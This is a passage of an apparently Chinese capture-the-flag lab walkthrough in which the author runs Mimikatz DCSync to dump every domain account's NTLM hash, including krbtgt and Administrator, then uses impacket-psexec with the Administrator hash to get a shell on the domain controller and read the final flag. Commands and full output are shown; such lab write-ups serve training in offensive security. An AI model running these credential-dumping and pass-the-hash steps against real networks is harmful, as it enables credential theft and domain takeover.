class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">_</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> ____</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">_</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">___ </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">_</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">_</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">____/</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">____/</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">_____</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">____/</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">___/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  v2.2.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Action: Import Ticket</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Ticket successfully imported</span><span class="token operator" style="color:#393A34">!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后使用 <code>Mimikatz</code> 直接 DCSync</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">randark</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Desktop</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> .</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">mimikatz_trunk</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">x64</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">mimikatz.exe </span><span class="token string" style="color:#e3116c">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span><span class="token plain"> </span><span class="token builtin class-name">exit</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token builtin class-name">.</span><span class="token comment" style="color:#999988;font-style:italic">#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token builtin class-name">.</span><span class="token comment" style="color:#999988;font-style:italic">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">## / \ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;## v ##&#x27;</span><span class="token plain">       Vincent LE TOUX             </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">vincent.letoux@gmail.com</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">&#x27;#####&#x27;</span><span class="token plain">        </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> https://pingcastle.com / https://mysmartlogon.com ***/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">commandline</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># lsadump::dcsync /domain:xiaorang.lab /all /csv</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">DC</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;xiaorang.lab&#x27;</span><span class="token plain"> will be the domain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">DC</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;DC01.xiaorang.lab&#x27;</span><span class="token plain"> will be the DC server</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">DC</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Exporting domain </span><span class="token string" style="color:#e3116c">&#x27;xiaorang.lab&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">rpc</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Service  </span><span class="token builtin class-name">:</span><span class="token plain"> ldap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">rpc</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> AuthnSvc </span><span class="token builtin class-name">:</span><span class="token plain"> GSS_NEGOTIATE </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">9</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">502</span><span class="token plain">     krbtgt  767e06b9c74fd628dd13785006a9092b        </span><span class="token number" style="color:#36acaa">514</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1105</span><span class="token plain">    Aldrich 98ce19dd5ce74f670d230c7b1aa016d0        </span><span class="token number" style="color:#36acaa">512</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1106</span><span class="token plain">    Marcus  b91c7cc463735bf0e599a2d0a04df110        </span><span class="token number" style="color:#36acaa">512</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1112</span><span class="token plain">    WIN-3X7U15C2XDM$        c3ddf0ffd17c48e6c40e6eda9c9fbaf7        </span><span class="token number" style="color:#36acaa">4096</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1113</span><span class="token plain">    WIN-YUUAW2QG9MF$        125d0e9790105be68deb6002690fc91b        </span><span class="token number" style="color:#36acaa">4096</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1000</span><span class="token plain">    DC01$   0d7eae0ce200697f7751e5f6e8080ccf        </span><span class="token number" style="color:#36acaa">532480</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">500</span><span class="token plain">     Administrator   4889f6553239ace1f7c47fa2c619c252        </span><span class="token number" style="color:#36acaa">512</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1103</span><span class="token plain">    FILESERVER$     ce6da0d051a2431e7a5456c0785a1c24        </span><span class="token number" style="color:#36acaa">4096</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1104</span><span class="token plain">    WIN19$  22efd36d08f27afdf0628d9ba2bff827        </span><span class="token number" style="color:#36acaa">528384</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">commandline</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># exit</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Bye</span><span class="token operator" style="color:#393A34">!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="1722247-dc-使用-administrator-哈希登录-dc">172.22.4.7 DC 使用 Administrator 哈希登录 DC<a href="#1722247-dc-使用-administrator-哈希登录-dc" class="hash-link" aria-label="172.22.4.7 DC 使用 Administrator 哈希登录 DC的直接链接" title="172.22.4.7 DC 使用 Administrator 哈希登录 DC的直接链接">​</a></h2>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~/pocs</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ proxychains4 </span><span class="token parameter variable" style="color:#36acaa">-q</span><span class="token plain"> impacket-psexec xiaorang/Administrator@172.22.4.7 </span><span class="token parameter variable" style="color:#36acaa">-hashes</span><span class="token plain"> :4889f6553239ace1f7c47fa2c619c252 </span><span class="token parameter variable" style="color:#36acaa">-codec</span><span class="token plain"> gbk</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Impacket v0.12.0.dev1 - Copyright </span><span class="token number" style="color:#36acaa">2023</span><span class="token plain"> Fortra</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Requesting shares on </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.7</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Found writable share ADMIN$</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Uploading </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> SStvEKTx.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Opening SVCManager on </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.7</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Creating </span><span class="token function" style="color:#d73a49">service</span><span class="token plain"> hYIt on </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.7</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Starting </span><span class="token function" style="color:#d73a49">service</span><span class="token plain"> hYIt</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token operator" style="color:#393A34">!</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Press </span><span class="token builtin class-name">help</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> extra shell commands</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Microsoft Windows </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">版本 </span><span class="token number" style="color:#36acaa">10.0</span><span class="token plain">.14393</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2016</span><span class="token plain"> Microsoft Corporation。保留所有权利。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">system3</span><span class="token operator file-descriptor important" style="color:#393A34">2</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">cd</span><span class="token plain"> C:/Users/Administrator/flag</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Administrator</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">flag</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">type</span><span class="token plain"> flag04.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ______   _______  _        _______  _______  _______ __________________ _______  _</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">__  </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">  ____ </span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">      </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">  ____ </span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">  ____ </span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">  ___</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">__   __/</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">__   __/</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">  ___  </span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">    /</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">/</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">/</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">/</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">      </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">||</span><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">||</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">__    </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">__    </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">___</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">||</span><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">||</span><span class="token plain">  __</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  __</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> ____ </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">  ___  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">||</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">||</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">_</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">||</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">__/</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">____/</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">____/</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">____/</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">___</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">||</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   ___</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">___</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">___</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">||</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">______/ </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_______/</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_______/</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_______/</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_______</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">/     </span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">_</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">_______/</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_______</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">/    </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">_</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Awesome</span><span class="token operator" style="color:#393A34">!</span><span class="token plain"> Now you have taken over the entire domain network.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag04: flag</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">6f4333a1-eed5-4bb4-9b6f-abdf55d0f67e</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="flag--04">flag- 04<a href="#flag--04" class="hash-link" aria-label="flag- 04的直接链接" title="flag- 04的直接链接">​</a></h2>
